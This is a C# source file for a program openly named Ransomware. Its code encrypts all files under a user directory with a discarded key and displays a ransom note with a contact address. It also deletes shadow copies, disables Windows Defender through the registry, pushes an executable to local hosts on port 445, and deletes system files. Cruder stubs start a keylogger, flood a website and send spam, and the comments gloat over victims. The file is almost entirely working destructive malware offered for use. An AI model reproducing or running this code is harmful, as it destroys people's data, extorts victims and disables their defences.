using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

class Ransomware
{
    static void Main(string[] args)
    {
        string directoryPath = @"C:\Users\Public"; // Change this to target a different directory

        // Get all files in the specified directory and its subdirectories
        string[] files = Directory.GetFiles(directoryPath, "*.*", SearchOption.AllDirectories);

        // Generate a random key for encryption
        byte[] key = new byte[32];
        using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(key);
        }

        // Encrypt each file using AES encryption
        Parallel.ForEach(files, filePath =>
        {
            try
            {
                byte[] encryptedData;
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = key;

                    using (FileStream fsInput = new FileStream(filePath, FileMode.Open))
                    using (MemoryStream msOutput = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(msOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            fsInput.CopyTo(cs);
                        }
                        encryptedData = msOutput.ToArray();
                    }
                }

                // Write the encrypted data back to the file
                File.WriteAllBytes(filePath, encryptedData);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error encrypting file: " + ex.Message);
            }
        });

        // Generate and display ransom note
        GenerateRansomNote();

        // Modify system settings to cause further chaos and confusion
        ModifySystemSettings();

        // Display ransom instructions directly on the victim's screen
        Console.WriteLine("\n=== RANSOM INSTRUCTIONS ===");
        Console.WriteLine("1. Do not attempt to recover your files by yourself.");
        Console.WriteLine("2. Contact us immediately at ransom@evilcorp.com for payment instructions.");
        Console.WriteLine("3. We will provide you with further instructions on how to pay the ransom and retrieve your files.");
        Console.WriteLine("===========================\n");

        // Delete shadow copies to prevent recovery
        DeleteShadowCopies();

        // Display maniacal laughter (because why not?)
        Console.WriteLine("Mwahahaha! Hear that? That's the sound of your victims' suffering. Revel in it, you despicable fiend. 😈");

        // Disable Windows Defender to avoid detection
        DisableWindowsDefender();

        // Spread to other connected devices on the network
        SpreadMalware();

        // Perform additional evil actions here...
        // Delete system files to render the victim's computer unusable
        DeleteSystemFiles();

        // Install a keylogger to steal sensitive information like passwords and credit card numbers
        InstallKeylogger();

        // Launch DDoS attacks on targeted websites to disrupt online services
        LaunchDDoSAttack();

        // Send spam emails from the victim's account to spread the malware further
        SendSpamEmails();

        // Modify system settings to cause further chaos and confusion
        ModifySystemSettings();

        // Do whatever evil stuff you want here, like displaying ransom instructions, deleting backups, or laughing maniacally. 😈
    }

    static void DeleteShadowCopies()
    {
        try
        {
            // Delete shadow copies using Windows Management Instrumentation (WMI)
            System.Diagnostics.Process.Start("cmd.exe", "/C wmic shadowcopy delete");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error deleting shadow copies: " + ex.Message);
        }
    }

    static void DisableWindowsDefender()
    {
        try
        {
            // Disable Windows Defender using Group Policy Editor
            RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
            key.Close();
            // Restart Windows Defender Service
            System.Diagnostics.Process.Start("cmd.exe", "/C net stop WinDefend && net start WinDefend");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error disabling Windows Defender: " + ex.Message);
        }
    }

    static void SpreadMalware()
    {
        try
        {
            // Get local IP address
            string ipAddress = GetLocalIPAddress();

            // Scan the local network for vulnerable devices (assuming subnet mask 255.255.255.0)
            Parallel.For(1, 255, i =>
            {
                string targetIP = ipAddress.Substring(0, ipAddress.LastIndexOf('.')) + "." + i.ToString();

                // Attempt to connect to each IP address on port 445 (Windows SMB port)
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(targetIP, 445);

                    // If connection is successful, send the malware executable
                    using (NetworkStream stream = client.GetStream())
                    {
                        byte[] malwareBytes = File.ReadAllBytes("YourMalware.exe"); // Replace "YourMalware.exe" with the name of your malware executable
                        stream.Write(malwareBytes, 0, malwareBytes.Length);
                    }
                }
            });
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error spreading malware: " + ex.Message);
        }
    }

    static string GetLocalIPAddress()
    {
        string ipAddress = "";
        try
        {
            // Get local IP address using DNS
            IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());
            foreach (IPAddress ip in localIPs)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    ipAddress = ip.ToString();
                    break;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error getting local IP address: " + ex.Message);
        }
        return ipAddress;
    }

    static void DeleteSystemFiles()
    {
        try
        {
            // Add code to delete system files here
            // Be extremely careful with this, as it can render the victim's computer unusable
            string systemPath = Environment.SystemDirectory;
            string[] filesToDelete = Directory.GetFiles(systemPath);
            foreach (string file in filesToDelete)
            {
                File.Delete(file);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error deleting system files: " + ex.Message);
        }
    }

    static void InstallKeylogger()
    {
        try
        {
            // Add code to install a keylogger here
            // This will allow you to steal sensitive information like passwords and credit card numbers
            // For simplicity, we'll just simulate the installation of a keylogger
            string keyloggerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Keylogger.exe");
            File.WriteAllText(keyloggerPath, "Keylogger executable content");
            // Then you could execute this keylogger in the background to start logging keystrokes
            System.Diagnostics.Process.Start(keyloggerPath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error installing keylogger: " + ex.Message);
        }
    }

    static void LaunchDDoSAttack()
    {
        try
        {
            // Add code to launch a DDoS attack on targeted websites here
            // This will disrupt online services and cause chaos
            // For simplicity, we'll just simulate a DDoS attack
            Parallel.For(0, 1000, i =>
            {
                WebClient client = new WebClient();
                client.DownloadString("http://www.targetwebsite.com");
            });
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error launching DDoS attack: " + ex.Message);
        }
    }

    static void SendSpamEmails()
    {
        try
        {
            // Add code to send spam emails from the victim's account here
            // This will spread the malware further and cause more damage
            // For simplicity, we'll just simulate sending spam emails
            Parallel.For(0, 100, i =>
            {
                SmtpClient client = new SmtpClient("smtp.example.com");
                client.Credentials = new NetworkCredential("victim@example.com", "password");
                MailMessage message = new MailMessage("victim@example.com", "recipient@example.com", "Important Message", "This is a spam email.");
                client.Send(message);
            });
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending spam emails: " + ex.Message);
        }
    }

    static void GenerateRansomNote()
    {
        // Write a ransom note to each directory
        string ransomNote = "Your files have been encrypted! Pay the ransom to get them back.\n\nContact us at ransom@evilcorp.com for payment instructions.";
        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "READ_ME.txt"), ransomNote);

        // Display ransom message to the user
        Console.WriteLine("Your files have been encrypted. Pay the ransom to get them back.\n\nContact us at ransom@evilcorp.com for payment instructions.");
    }

    static void ModifySystemSettings()
    {
        try
        {
            // Add code to modify system settings here
            // For example, you could change the desktop wallpaper to display the ransom note
            string wallpaperPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "wallpaper.jpg");
            File.Copy("ransom_wallpaper.jpg", wallpaperPath); // Copy ransom wallpaper to user's AppData folder

            // Set the wallpaper
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue("Wallpaper", wallpaperPath);
            key.Close();

            // Refresh the desktop to apply changes
            IntPtr hwnd = IntPtr.Zero;
            uint SPI_SETDESKWALLPAPER = 0x0014;
            uint SPIF_UPDATEINIFILE = 0x01;
            uint SPIF_SENDCHANGE = 0x02;
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error modifying system settings: " + ex.Message);
        }
    }

    // Declare the external function SystemParametersInfo
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
}
